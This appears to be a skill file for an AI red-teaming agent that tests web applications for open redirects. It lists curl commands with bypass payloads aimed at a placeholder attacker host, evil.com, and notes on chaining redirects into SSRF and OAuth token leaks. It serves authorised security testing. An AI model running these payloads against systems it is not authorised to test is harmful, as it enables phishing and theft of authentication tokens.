---
name: open-redirect-testing
description: Test for unvalidated redirects — URL parameters, login flows, OAuth callbacks that redirect to attacker-controlled domains
origin: RedteamOpencode
---

# Open Redirect Testing

## When to Activate

- Any URL parameter containing a URL or path (redirect, url, next, return, returnTo, goto, dest, target, rurl, callback)
- Login/logout flows with redirect after auth
- OAuth/SSO callback URLs
- Payment completion redirects
- Email verification links

## Methodology

### 1. Identify Redirect Parameters

```bash
# Common redirect parameter names
for param in redirect url next return returnTo goto dest target rurl callback continue redir forward ref; do
  code=$(run_tool curl -s -o /dev/null -w "%{http_code}" "http://target/?${param}=https://evil.com")
  [ "$code" = "302" ] || [ "$code" = "301" ] || [ "$code" = "303" ] && echo "  $param → $code (potential redirect)"
done
```

### 2. Test Redirect Bypass Techniques

```bash
TARGET="http://target/redirect?url="
# Direct external URL
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://evil.com"
# Protocol-relative
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}//evil.com"
# Backslash
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://evil.com%5c"
# @ bypass (user@host)
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://target@evil.com"
# Subdomain bypass
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://target.evil.com"
# URL encoding
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https%3A%2F%2Fevil.com"
# Double URL encoding
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https%253A%252F%252Fevil.com"
# Null byte
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://evil.com%00target.com"
```

### 3. Test in Authentication Flows

```bash
# Post-login redirect
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "http://target/login?redirect=https://evil.com"
# OAuth callback
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "http://target/oauth/callback?redirect_uri=https://evil.com"
```

### 4. Advanced Parser-Confusion Bypasses

```bash
TARGET="http://target/redirect?url="
# Malformed scheme (some parsers treat missing "//" as relative, browsers don't)
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https:evil.com"
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}/\\evil.com"
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}\\\\evil.com"
# Whitespace/control-char prefix confuses "starts with /" allowlist checks
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}%09https://evil.com"
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}%0d%0ahttps://evil.com"
# Path-based bypass when only domain string is checked, not full URL
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://trusted.com.evil.com"
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://evil.com/trusted.com"
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://evil.com?trusted.com"
run_tool curl -s -o /dev/null -w "%{http_code} %{redirect_url}" "${TARGET}https://evil.com#trusted.com"
# JS-sink redirects (location.href / window.open in reflected params, not server 30x)
# check page source for: location.href=, location.replace(, window.open(, meta refresh with user-controlled url
```

### 5. Open Redirect → SSRF / Token Leak Chaining

- [ ] If the redirect target reaches an internal service that trusts the caller (e.g. an SSRF-vulnerable fetcher that follows redirects), chain into `ssrf-testing`
- [ ] If the redirect happens post-OAuth-authorization with the auth code/token in the fragment or query, a redirect to attacker domain leaks the token directly — treat as auth-bypass severity, see `oauth-oidc-testing`
- [ ] Check whether `Referer`/`Referrer-Policy` leaks the pre-redirect URL (and any embedded token) to the attacker-controlled landing page

## What to Record

- Redirect parameter name and endpoint
- Which bypass technique worked
- Whether it's an absolute redirect (to external domain) or relative only
